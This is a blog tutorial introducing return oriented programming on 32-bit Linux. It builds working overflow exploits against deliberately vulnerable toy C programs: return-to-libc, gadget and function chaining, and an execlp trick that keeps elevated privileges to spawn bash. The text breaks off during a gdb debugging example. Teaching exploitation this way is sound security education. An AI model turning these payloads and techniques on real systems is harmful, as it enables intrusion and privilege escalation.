<!DOCTYPE html>
<html lang="en">
<head>
        <title>Introduction to return oriented programming (ROP)</title>
        <meta charset="utf-8" />
        <link rel="stylesheet" href="http://codearcana.com/theme/css/main.css" type="text/css" />
        <link href="http://codearcana.com/" type="application/atom+xml" rel="alternate" title="Code Arcana ATOM Feed" />


        <!--[if IE]>
                <script src="http://html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->

        <!--[if lte IE 7]>
                <link rel="stylesheet" type="text/css" media="all" href="http://codearcana.com/css/ie.css"/>
                <script src="http://codearcana.com/js/IE8.js" type="text/javascript"></script><![endif]-->

        <!--[if lt IE 7]>
                <link rel="stylesheet" type="text/css" media="all" href="http://codearcana.com/css/ie6.css"/><![endif]-->

</head>

<body id="index" class="home">
        <header id="banner" class="body">
                <h1><a href="http://codearcana.com/index.html">Code Arcana </a></h1>
                <nav><ul>
                    <li><a href="http://codearcana.com">Blog</a></li>
                    <li><a href="http://codearcana.com/archives.html">Archives</a></li>
                    <li ><a href="http://codearcana.com/pages/about.html">About</a></li>
                </ul></nav>
        </header><!-- /#banner -->

<section id="content" class="body">
<article>
        <header> <h1 class="entry-title"><a href="posts/2013/05/28/introduction-to-return-oriented-programming-rop.html"
        rel="bookmark" title="Permalink to Introduction to return oriented programming (ROP)">Introduction to return oriented programming (ROP)</a></h1> <a href="http://twitter.com/share" class="twitter-share-button" data-count="horizontal" data-via="awreece">Tweet</a><script type="text/javascript" src="http://platform.twitter.com/widgets.js"></script>
 </header>
<footer class="post-info">
        <abbr class="published" title="2013-05-28T00:00:00">
                Tue 28 May 2013
        </abbr>

        <address class="vcard author">
                By <a class="url fn" href="http://codearcana.com/author/alex-reece.html">Alex Reece</a>
        </address>
<p>In <a href="http://codearcana.com/category/security.html">security</a>. </p>
<p>tags: <a href="http://codearcana.com/tag/exploitation.html">exploitation</a><a href="http://codearcana.com/tag/tutorial.html">tutorial</a></p></footer><!-- /.post-info --><!-- /.post-info -->
        <div class="entry-content">
        <h1>What is ROP?</h1>
<p>Return Oriented Programming (ROP) is a powerful technique used to counter common exploit prevention strategies. In particular, ROP is useful for circumventing Address Space Layout Randomization (ASLR)<sup id="fnref:1"><a class="footnote-ref" href="#fn:1" rel="footnote">1</a></sup> and DEP<sup id="fnref:2"><a class="footnote-ref" href="#fn:2" rel="footnote">2</a></sup>. When using ROP, an attacker uses his/her control over the stack right before the return from a function to direct code execution to some other location in the program. Except on very hardened binaries, attackers can easily find a portion of code that is located in a fixed location (circumventing ASLR) and which is executable (circumventing DEP). Furthermore, it is relatively straightforward to chain several payloads to achieve (almost) arbitrary code execution. </p>
<h1>Before we begin</h1>
<p>If you are attempting to follow along with this tutorial, it might be helpful
to have a Linux machine you can compile and run 32 bit code on. If you install
the correct libraries, you can compile 32 bit code on a 64 bit machine with the
<code>-m32</code> flag via <code>gcc -m32 hello_world.c</code>. I will target this tutorial mostly at
32 bit programs because ROP on 64 bit follows the same principles, but is just
slightly more technically challenging. For the purpose of this tutorial, I will
assume that you are familiar with x86 C calling conventions and stack
management. I will attempt to provide a brief explanation
<a href="http://codearcana.com/posts/2013/05/21/a-brief-introduction-to-x86-calling-conventions.html">here</a>, but you are encouraged to explore
in more depth on your own. Lastly, you should be familiar with a unix command
line interface.</p>
<h1>My first ROP</h1>
<p>The first thing we will do is use ROP to call a function in a very simple binary. In particular, we will be attempting to call <code>not_called</code> in the following program<sup id="fnref:3"><a class="footnote-ref" href="#fn:3" rel="footnote">3</a></sup>:</p>
<div class="highlight"><pre><span class="kt">void</span> <span class="nf">not_called</span><span class="p">()</span> <span class="p">{</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Enjoy your shell!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
    <span class="n">system</span><span class="p">(</span><span class="s">&quot;/bin/bash&quot;</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">vulnerable_function</span><span class="p">(</span><span class="kt">char</span><span class="o">*</span> <span class="n">string</span><span class="p">)</span> <span class="p">{</span>
    <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">100</span><span class="p">];</span>
    <span class="n">strcpy</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="n">string</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">**</span> <span class="n">argv</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">vulnerable_function</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>


<p>We disassemble the program to learn the information we will need in order to exploit it: the size of the buffer and the address of <code>not_called</code>:</p>
<div class="highlight"><pre><span class="gp">$</span> gdb -q a.out
<span class="go">Reading symbols from /home/ppp/a.out...(no debugging symbols found)...done.</span>
<span class="go">(gdb) disas vulnerable_function </span>
<span class="go">Dump of assembler code for function vulnerable_function:</span>
<span class="go">   0x08048464 &lt;+0&gt;:  push   %ebp</span>
<span class="go">   0x08048465 &lt;+1&gt;:  mov    %esp,%ebp</span>
<span class="go">   0x08048467 &lt;+3&gt;:  sub    $0x88,%esp</span>
<span class="go">   0x0804846d &lt;+9&gt;:  mov    0x8(%ebp),%eax</span>
<span class="go">   0x08048470 &lt;+12&gt;: mov    %eax,0x4(%esp)</span>
<span class="go">   0x08048474 &lt;+16&gt;: lea    -0x6c(%ebp),%eax</span>
<span class="go">   0x08048477 &lt;+19&gt;: mov    %eax,(%esp)</span>
<span class="go">   0x0804847a &lt;+22&gt;: call   0x8048340 &lt;strcpy@plt&gt;</span>
<span class="go">   0x0804847f &lt;+27&gt;: leave  </span>
<span class="go">   0x08048480 &lt;+28&gt;: ret   </span>
<span class="go">End of assembler dump.</span>
<span class="go">(gdb) print not_called</span>
<span class="gp">$</span><span class="nv">1</span> <span class="o">=</span> <span class="o">{</span>&lt;text variable, no debug info&gt;<span class="o">}</span> 0x8048444 &lt;not_called&gt;
</pre></div>


<p>We see that <code>not_called</code> is at <code>0x8048444</code> and the buffer <code>0x6c</code> bytes long. Right before the call to <code>strcpy@plt</code>, the stack in fact looks like:</p>
<div class="highlight"><pre>| &lt;argument&gt;          |
| &lt;return address&gt;    |
| &lt;old %ebp&gt;          | &lt;= %ebp
| &lt;0x6c bytes of      |
|       ...           |
|       buffer&gt;       |
| &lt;argument&gt;          |
| &lt;address of buffer&gt; | &lt;= %esp
</pre></div>


<p>Since we want our payload to overwrite the return address, we provide 0x6c bytes to fill the buffer, 4 bytes to replace the old <code>%ebp</code>, and the target address (in this case, the address of <code>not_called</code>). Our payload looks like:</p>
<div class="highlight"><pre>| 0x8048444 &lt;not_called&gt;     |
| 0x42424242 &lt;fake old %ebp&gt; |
| 0x41414141 ...             |
|   ... (0x6c bytes of &#39;A&#39;s) |
|   ... 0x41414141           |
</pre></div>


<p>We try this and we get our shell<sup id="fnref:4"><a class="footnote-ref" href="#fn:4" rel="footnote">4</a></sup>:</p>
<div class="highlight"><pre><span class="gp">$</span> ./a.out <span class="s2">&quot;$(python -c &#39;print &quot;</span>A<span class="s2">&quot;*0x6c + &quot;</span>BBBB<span class="s2">&quot; + &quot;</span><span class="se">\x</span>44<span class="se">\x</span>84<span class="se">\x</span>04<span class="se">\x</span>08<span class="s2">&quot;&#39;)&quot;</span>
<span class="go">Enjoy your shell!</span>
<span class="gp">$</span> 
</pre></div>


<h1>Calling arguments</h1>
<p>Now that we can return to an arbitrary function, we want to be able to pass arbitrary arguments. We will exploit this simple program<sup id="fnref:3"><a class="footnote-ref" href="#fn:3" rel="footnote">3</a></sup>:</p>
<div class="highlight"><pre><span class="kt">char</span><span class="o">*</span> <span class="n">not_used</span> <span class="o">=</span> <span class="s">&quot;/bin/sh&quot;</span><span class="p">;</span>

<span class="kt">void</span> <span class="nf">not_called</span><span class="p">()</span> <span class="p">{</span>
    <span class="n">printf</span><span class="p">(</span><span class="s">&quot;Not quite a shell...</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
    <span class="n">system</span><span class="p">(</span><span class="s">&quot;/bin/date&quot;</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">vulnerable_function</span><span class="p">(</span><span class="kt">char</span><span class="o">*</span> <span class="n">string</span><span class="p">)</span> <span class="p">{</span>
    <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">100</span><span class="p">];</span>
    <span class="n">strcpy</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="n">string</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">**</span> <span class="n">argv</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">vulnerable_function</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>


<p>This time, we cannot simply return to <code>not_called</code>. Instead, we want to call <code>system</code> with the correct argument. First, we print out the values we need using <code>gdb</code>:</p>
<!--
[^6]: There are other ways to do this. `nm` is a popular choice for printing the symbols in a binary, but I don't know

wzxhzdk:6

-->

<div class="highlight"><pre><span class="gp">$</span> gdb -q a.out
<span class="go">Reading symbols from /home/ppp/a.out...(no debugging symbols found)...done.</span>
<span class="go">(gdb) pring &#39;system@plt&#39;</span>
<span class="gp">$</span><span class="nv">1</span> <span class="o">=</span> <span class="o">{</span>&lt;text variable, no debug info&gt;<span class="o">}</span> 0x8048360 &lt;system@plt&gt;
<span class="go">(gdb) x/s not_used</span>
<span class="go">0x8048580:   &quot;/bin/sh&quot;</span>
</pre></div>


<p>In order to call <code>system</code> with the argument <code>not_used</code>, we have to set up the stack. Recall, right after <code>system</code> is called it expects the stack to look like this:</p>
<div class="highlight"><pre>| &lt;argument&gt;       |
| &lt;return address&gt; |
</pre></div>


<p>We will construct our payload such that the stack looks like a call to <code>system(not_used)</code> immediately after the return. We thus make our payload:</p>
<div class="highlight"><pre>| 0x8048580 &lt;not_used&gt;             |
| 0x43434343 &lt;fake return address&gt; |
| 0x8048360 &lt;address of system&gt;    |
| 0x42424242 &lt;fake old %ebp&gt;       |
| 0x41414141 ...                   |
|   ... (0x6c bytes of &#39;A&#39;s)       |
|   ... 0x41414141                 |
</pre></div>


<p>We try this and get out shell:</p>
<div class="highlight"><pre><span class="gp">$</span> ./a.out <span class="s2">&quot;$(python -c &#39;print &quot;</span>A<span class="s2">&quot;*0x6c + &quot;</span>BBBB<span class="s2">&quot; + &quot;</span><span class="se">\x</span>60<span class="se">\x</span>83<span class="se">\x</span>04<span class="se">\x</span>08<span class="s2">&quot; + &quot;</span>CCCC<span class="s2">&quot; + &quot;</span><span class="se">\x</span>80<span class="se">\x</span>85<span class="se">\x</span>04<span class="se">\x</span>08<span class="s2">&quot;&#39;)&quot;</span>
<span class="gp">$</span>
</pre></div>


<h1>Return to <code>libc</code></h1>
<p>So far, we've only been looking at contrived binaries that contain the pieces we need for our exploit. Fortunately, ROP is still fairly straightforward without this handicap. The trick is to realize that programs that use functions from a shared library, like <code>printf</code> from <code>libc</code>, will link <em>the entire library</em> into their address space at run time. This means that even if they never call <code>system</code>, the code for <code>system</code> (and every other function in <code>libc</code>) is accessible at runtime. We can see this fairly easy in <code>gdb</code>:</p>
<div class="highlight"><pre><span class="gp">$</span> <span class="nb">ulimit</span> -s unlimited
<span class="gp">$</span> gdb -q a.out
<span class="go">Reading symbols from /home/ppp/a.out...(no debugging symbols found)...done.</span>
<span class="go">(gdb) break main</span>
<span class="go">Breakpoint 1 at 0x8048404</span>
<span class="go">(gdb) run</span>
<span class="go">Starting program: /home/ppp/a.out </span>

<span class="go">Breakpoint 1, 0x08048404 in main ()</span>
<span class="go">(gdb) print system</span>
<span class="gp">$</span><span class="nv">1</span> <span class="o">=</span> <span class="o">{</span>&lt;text variable, no debug info&gt;<span class="o">}</span> 0x555d2430 &lt;system&gt;
<span class="go">(gdb) find 0x555d2430, +999999999999, &quot;/bin/sh&quot;</span>
<span class="go">0x556f3f18</span>
<span class="go">warning: Unable to access target memory at 0x5573a420, halting search.</span>
<span class="go">1 pattern found.</span>
</pre></div>


<p>This example illustrates several important tricks. First, the use of <code>ulimit -s unlimited</code> which will disable library randomization on 32-bit programs. Next, we must run the program and break at main, after libraries are loaded, to print values in shared libraries (but after we do so, then even functions unused by the program are available to us). Last, the <code>libc</code> library actually contains the string <code>/bin/sh</code>, which we can find with <code>gdb</code><sup id="fnref:7"><a class="footnote-ref" href="#fn:7" rel="footnote">5</a></sup> use for exploits!</p>
<p>It is fairly straightforward to plug both of these addresses into our previous exploit:</p>
<div class="highlight"><pre><span class="gp">$</span> ./a.out <span class="s2">&quot;$(python -c &#39;print &quot;</span>A<span class="s2">&quot;*0x6c + &quot;</span>BBBB<span class="s2">&quot; + &quot;</span><span class="se">\x</span>30<span class="se">\x</span>24<span class="se">\x</span>5d<span class="se">\x</span>55<span class="s2">&quot; + &quot;</span>CCCC<span class="s2">&quot; + &quot;</span><span class="se">\x</span>18<span class="se">\x</span>3f<span class="se">\x</span>6f<span class="se">\x</span>55<span class="s2">&quot;&#39;)&quot;</span>
<span class="gp">$</span>
</pre></div>


<h1>Chaining gadgets</h1>
<p>With ROP, it is possible to do far more powerful things than calling a single function. In fact, we can use it to run arbitrary code<sup id="fnref:8"><a class="footnote-ref" href="#fn:8" rel="footnote">6</a></sup> rather than just calling functions we have available to us. We do this by returning to <em>gadgets</em>, which are short sequences of instructions ending in a <code>ret</code>. For example, the following pair of gadgets can be used to write an arbitrary value to an arbitrary location: </p>
<div class="highlight"><pre><span class="nf">pop</span> <span class="nv">%ecx</span>
<span class="nf">pop</span> <span class="nv">%eax</span>
<span class="nf">ret</span>
</pre></div>


<div class="highlight"><pre><span class="nf">mov</span> <span class="nv">%eax</span><span class="p">,</span> <span class="p">(</span><span class="nv">%ecx</span><span class="p">)</span>
<span class="nf">ret</span>
</pre></div>


<p>These work by <code>pop</code>ing values from the stack (which we control) into registers and then executing code that uses them. To use, we set up the stack like so:</p>
<div class="highlight"><pre>| &lt;address of mov %eax, (%ecx)&gt;        |
| &lt;value to write&gt;                     |
| &lt;address to write to&gt;                |
| &lt;address of pop %ecx; pop %eax; ret&gt; |
</pre></div>


<p>You'll see that the first gadget returns to the second gadget, continuing the chain of attacker controlled code execution (this next gadget can continue).</p>
<p>Other useful gadgets include <code>xchg %eax, %esp</code> and <code>add $0x1c,%esp</code>, which can be used to modify the stack pointer and <em>pivot</em> it to a attacker controlled buffer. This is useful if the original vulnerability only gave control over <code>%eip</code> (like in a <a href="http://codearcana.com/posts/2013/05/02/introduction-to-format-string-exploits.html">format string vulnerability</a>) or if the attacker does not control very much of the stack (as would be the case for a short buffer overflow).</p>
<h1>Chaining functions</h1>
<p>We can also use ROP to chain function calls: rather than a dummy return address, we use a <code>pop; ret</code> gadget to move the stack above the arguments to the first function. Since we are just using the <code>pop; ret</code> gadget to adjust the stack, we don't care what register it pops into (the value will be ignored anyways). As an example, we'll exploit the following binary<sup id="fnref:3"><a class="footnote-ref" href="#fn:3" rel="footnote">3</a></sup>:</p>
<div class="highlight"><pre><span class="kt">char</span> <span class="n">string</span><span class="p">[</span><span class="mi">100</span><span class="p">];</span>

<span class="kt">void</span> <span class="nf">exec_string</span><span class="p">()</span> <span class="p">{</span>
    <span class="n">system</span><span class="p">(</span><span class="n">string</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">add_bin</span><span class="p">(</span><span class="kt">int</span> <span class="n">magic</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">magic</span> <span class="o">==</span> <span class="mh">0xdeadbeef</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">strcat</span><span class="p">(</span><span class="n">string</span><span class="p">,</span> <span class="s">&quot;/bin&quot;</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">add_sh</span><span class="p">(</span><span class="kt">int</span> <span class="n">magic1</span><span class="p">,</span> <span class="kt">int</span> <span class="n">magic2</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">magic1</span> <span class="o">==</span> <span class="mh">0xcafebabe</span> <span class="o">&amp;&amp;</span> <span class="n">magic2</span> <span class="o">==</span> <span class="mh">0x0badf00d</span><span class="p">)</span> <span class="p">{</span>
        <span class="n">strcat</span><span class="p">(</span><span class="n">string</span><span class="p">,</span> <span class="s">&quot;/sh&quot;</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>

<span class="kt">void</span> <span class="nf">vulnerable_function</span><span class="p">(</span><span class="kt">char</span><span class="o">*</span> <span class="n">string</span><span class="p">)</span> <span class="p">{</span>
    <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">100</span><span class="p">];</span>
    <span class="n">strcpy</span><span class="p">(</span><span class="n">buffer</span><span class="p">,</span> <span class="n">string</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">**</span> <span class="n">argv</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">string</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">vulnerable_function</span><span class="p">(</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>


<p>We can see that the goal is to call <code>add_bin</code>, then <code>add_sh</code>, then <code>exec_string</code>. When we call <code>add_bin</code>, the stack must look like:</p>
<div class="highlight"><pre>| &lt;argument&gt;       |
| &lt;return address&gt; |
</pre></div>


<p>In our case, we want the argument to be <code>0xdeadbeef</code> we want the return address to be a <code>pop; ret</code> gadget. This will remove <code>0xdeadbeef</code> from the stack and return to the next gadget on the stack. We thus have a gadget to call <code>add_bin(0xdeadbeef)</code> that looks like:</p>
<div class="highlight"><pre>| 0xdeadbeef            |
| &lt;address of pop; ret&gt; |
| &lt;address of add_bin&gt;  |
</pre></div>


<p>Since <code>add_sh(0xcafebabe, 0x0badf00d)</code> use two arguments, we need a <code>pop; pop; ret</code>:</p>
<div class="highlight"><pre>| 0x0badf00d                 |
| 0xcafebabe                 |
| &lt;address of pop; pop; ret&gt; |
| &lt;address of add_sh&gt;        |
</pre></div>


<p>When we put these together, our payload looks like:</p>
<div class="highlight"><pre>| &lt;address of exec_string&gt;     |
| 0x0badf00d                   |
| 0xcafebabe                   |
| &lt;address of pop; pop; ret&gt;   |
| &lt;address of add_sh&gt;          |
| 0xdeadbeef                   |
| &lt;address of pop; ret&gt;        |
| &lt;address of add_bin&gt;         |
| 0x42424242 (fake saved %ebp) |
| 0x41414141 ...               |
|   ... (0x6c bytes of &#39;A&#39;s)   |
|   ... 0x41414141             |
</pre></div>


<p>This time we will use a <code>python</code> wrapper (which will also show off the use of the very useful <code>struct</code> python module).</p>
<div class="highlight"><pre><span class="c">#!/usr/bin/python</span>

<span class="kn">import</span> <span class="nn">os</span>
<span class="kn">import</span> <span class="nn">struct</span>

<span class="c"># These values were found with `objdump -d a.out`.</span>
<span class="n">pop_ret</span> <span class="o">=</span> <span class="mh">0x8048474</span>
<span class="n">pop_pop_ret</span> <span class="o">=</span> <span class="mh">0x8048473</span>
<span class="n">exec_string</span> <span class="o">=</span> <span class="mh">0x08048414</span>
<span class="n">add_bin</span> <span class="o">=</span> <span class="mh">0x08048428</span>
<span class="n">add_sh</span> <span class="o">=</span> <span class="mh">0x08048476</span>

<span class="c"># First, the buffer overflow.</span>
<span class="n">payload</span> <span class="o">=</span>  <span class="s">&quot;A&quot;</span><span class="o">*</span><span class="mh">0x6c</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;BBBB&quot;</span>

<span class="c"># The add_bin(0xdeadbeef) gadget.</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&quot;I&quot;</span><span class="p">,</span> <span class="n">add_bin</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&quot;I&quot;</span><span class="p">,</span> <span class="n">pop_ret</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&quot;I&quot;</span><span class="p">,</span> <span class="mh">0xdeadbeef</span><span class="p">)</span>

<span class="c"># The add_sh(0xcafebabe, 0x0badf00d) gadget.</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&quot;I&quot;</span><span class="p">,</span> <span class="n">add_sh</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&quot;I&quot;</span><span class="p">,</span> <span class="n">pop_pop_ret</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&quot;I&quot;</span><span class="p">,</span> <span class="mh">0xcafebabe</span><span class="p">)</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&quot;I&quot;</span><span class="p">,</span> <span class="mh">0xbadf00d</span><span class="p">)</span>

<span class="c"># Our final destination.</span>
<span class="n">payload</span> <span class="o">+=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">&quot;I&quot;</span><span class="p">,</span> <span class="n">exec_string</span><span class="p">)</span>

<span class="n">os</span><span class="o">.</span><span class="n">system</span><span class="p">(</span><span class="s">&quot;./a.out </span><span class="se">\&quot;</span><span class="si">%s</span><span class="se">\&quot;</span><span class="s">&quot;</span> <span class="o">%</span> <span class="n">payload</span><span class="p">)</span>
</pre></div>


<h1>Some useful tricks</h1>
<p>One common protection you will see on modern systems is for <code>bash</code> to drop privileges if it is executed with a higher effective user id than saved user id. This is a little bit annoying for attackers, because <code>/bin/sh</code> frequently is a symlink to <code>bash</code>. Since <code>system</code> internally executes <code>/bin/sh -c</code>, this means that commands run from <code>system</code> will have privileges dropped!</p>
<p>In order to circumvent this, we will instead use <code>execlp</code> to execute a <code>python</code> script we control in our local directory. We will demonstrate this and a few other tricks while exploiting the following simple program:</p>
<div class="highlight"><pre><span class="kt">void</span> <span class="nf">vulnerable_read</span><span class="p">()</span> <span class="p">{</span>
    <span class="kt">char</span> <span class="n">buffer</span><span class="p">[</span><span class="mi">100</span><span class="p">];</span>
    <span class="n">read</span><span class="p">(</span><span class="n">STDIN_FILENO</span><span class="p">,</span> <span class="n">buffer</span><span class="p">,</span> <span class="mi">200</span><span class="p">);</span>
<span class="p">}</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span><span class="o">**</span> <span class="n">argv</span><span class="p">)</span> <span class="p">{</span>
    <span class="n">vulnerable_read</span><span class="p">();</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>


<p>The general strategy will be to execute a <code>python</code> script via <code>execlp</code>, which searches the <code>PATH</code> environment variable for an executable of the correct name.</p>
<h2>Unix filenames</h2>
<p>We know how to find the address of <code>execlp</code> using <code>gdb</code>, but what file do we execute? The trick is to realize that Unix filenames can have (almost) arbitrary characters in them. We then just have to find a string that functions as a valid filename somewhere in memory. Fortunately, those are are all over the text segment of program. In <code>gdb</code>, we can get all the information we need:</p>
<div class="highlight"><pre><span class="gp">$</span> gdb -q ./a.out
<span class="go">Reading symbols from /home/ppp/a.out...(no debugging symbols found)...done.</span>
<span class="go">(gdb) bread main</span>
<span class="go">Breakpoint 1 at 0x80483fd</span>
<span class="go">(gdb) run</span>
<span class="go">Starting program: /home/ppp/a.out </span>

<span class="go">Breakpoint 1, 0x080483fd in main ()</span>
<span class="go">(gdb) print execlp</span>
<span class="gp">$</span><span class="nv">1</span> <span class="o">=</span> <span class="o">{</span>&lt;text variable, no debug info&gt;<span class="o">}</span> 0x5564b6f0 &lt;execlp&gt;
<span class="go">(gdb) x/s main</span>
<span class="go">0x80483fa &lt;main&gt;:    &quot;U\211\345\203\344\360\350\317\377\377\377\270&quot;</span>
</pre></div>


<p>We will execute the file <code>U\211\345\203\344\360\350\317\377\377\377\270</code>. We first create this file in some temporary directory and make sure it is executable<sup id="fnref:10"><a class="footnote-ref" href="#fn:10" rel="footnote">7</a></sup> and in our <code>PATH</code>. We want a bash shell, so for now the file will simply ensure <code>bash</code> will not drop privileges:</p>
<div class="highlight"><pre><span class="gp">$</span> vim <span class="s1">$&#39;U\211\345\203\344\360\350\317\377\377\377\270&#39;</span>
<span class="gp">$</span> cat <span class="s1">$&#39;U\211\345\203\344\360\350\317\377\377\377\270&#39;</span>
<span class="gp">#</span>!/usr/bin/python
<span class="go">import os</span>
<span class="go">os.setresuid(os.geteuid(), os.geteuid(), os.geteuid())</span>
<span class="go">os.execlp(&quot;bash&quot;, &quot;bash&quot;)</span>
<span class="gp">$</span> chmod +x <span class="s1">$&#39;U\211\345\203\344\360\350\317\377\377\377\270&#39;</span>
<span class="gp">$</span> <span class="nb">export </span><span class="nv">PATH</span><span class="o">=</span><span class="k">$(</span><span class="nb">pwd</span><span class="k">)</span>:<span class="nv">$PATH</span>
</pre></div>


<h2>Keeping <code>stdin</code> open</h2>
<p>Before we can exploit this, we have to be aware of one last trick. We want to avoid closing <code>stdin</code> when we exec our shell. If we just naively piped output to our program through <code>python</code>, we would see <code>bash</code> execute and then quit immediately. What we do instead is we use a special <code>bash</code> sub shell and <code>cat</code> to keep <code>stdin</code> open<sup id="fnref:11"><a class="footnote-ref" href="#fn:11" rel="footnote">8</a></sup>. The following command concatenates the output of the <code>python</code> command with standard in, thus keeping it open for <code>bash</code>:</p>
<div class="highlight"><pre><span class="go">cat &lt;(python -c &#39;print &quot;my_payload&quot;&#39;) - | ./a.out</span>
</pre></div>


<p>Now that we know all the tricks we need, we can exploit the program. First, we plan what we want the stack to look like:</p>
<div class="highlight"><pre>| 0x0 (NULL)                              |
| 0x80483fa &lt;address of the weird string&gt; |
| 0x80483fa &lt;address of the weird string&gt; |
| 0x5564b6f0 &lt;address of execlp&gt;          |
| 0x42424242 &lt;fake old %ebp&gt;              |
| 0x41414141 ...                          |
|   ... (0x6c bytes of &#39;A&#39;s)              |
|   ... 0x41414141                        |
</pre></div>


<p>Putting it all together, we get our shell:</p>
<div class="highlight"><pre><span class="gp">$</span> cat &lt;<span class="o">(</span>python -c <span class="s1">&#39;print &quot;A&quot;*0x6c + &quot;BBBB&quot; + &quot;\xf0\xb6\x64\x55&quot; + &quot;\xfa\x83\x04\x08&quot;*2 + &quot;\x00\x00\x00\x00&quot;&#39;</span><span class="o">)</span> - | ./a.out
</pre></div>


<p>To recap, this exploit required us to use the following tricks in addition to ROP:</p>
<ul>
<li>Executing <code>python</code> since <code>bash</code> drops privileges</li>
<li>Controlling the <code>PATH</code> and executing a file in a directory we control with <code>execlp</code>.</li>
<li>Choosing a filename that was a "string" of bytes from the code segment.</li>
<li>Keeping <code>stdin</code> open using <code>bash</code> sub shells and <code>cat</code>.</li>
</ul>
<h1>Debugging</h1>
<h2><code>gdb</code></h2>
<p>When you exploit doesn't work the first time, there are some tricks you can use to debug and figure out what is going on. The first thing you should do is run the exploit in <code>gdb</code> with your payload. You should break on the return address of the function you are overflowing and print the stack to make sure it is what you expect. In the following example, I forgot to do <code>ulimit -s unlimited</code> before calculating <code>libc</code> addresses so the address of <code>execlp</code> is wrong:</p>
<div class="highlight"><pre><span class="gp">$</span> gdb -q a.out
<span class="go">Reading symbols from /tmp/a.out...(no debugging symbols found)...done.</span>
<span class="go">(gdb) disas vulnerable_read</span>
<span class="go">Dump of assembler code for function vulnerable_read:</span>
<span class="go">   0x080483d4 &lt;+0&gt;:  push   %ebp</span>
<span class="go">   0x080483d5 &lt;+1&gt;:  mov    %esp,%ebp</span>
<span class="go">   0x080483d7 &lt;+3&gt;:  sub    $0x88,%esp</span>
<span class="go">   0x080483dd &lt;+9&gt;:  movl   $0xc8,0x8(%esp)</span>
<span class="go">   0x080483e5 &lt;+17&gt;: lea    -0x6c(%ebp),%eax</span>
<span class="go">   0x080483e8 &lt;+20&gt;: mov    %eax,0x4(%esp)</span>
<span class="go">   0x080483ec &lt;+24&gt;: movl   $0x0,(%esp)</span>
<span class="go">   0x080483f3 &lt;+31&gt;: call   0x80482f0 &lt;read@plt&gt;</span>
<span class="go">   0x080483f8 &lt;+36&gt;: leave  </span>
<span class="go">   0x080483f9 &lt;+37&gt;: ret    </span>
<span class="go">End of assembler dump.</span>
<span class="go">(gdb) break *0x080483f9</span>
<span class="go">Breakpoint 1 at 0x80483f9</span>
<span class="go">(gdb) run &lt;in</span>
<span class="go">Starting program: /tmp/a.out &lt;in</span>

<span class="go">Breakpoint 1, 0x080483f9 in vulnerable_read ()</span>
<span class="go">(gdb) x/4a $esp</span>
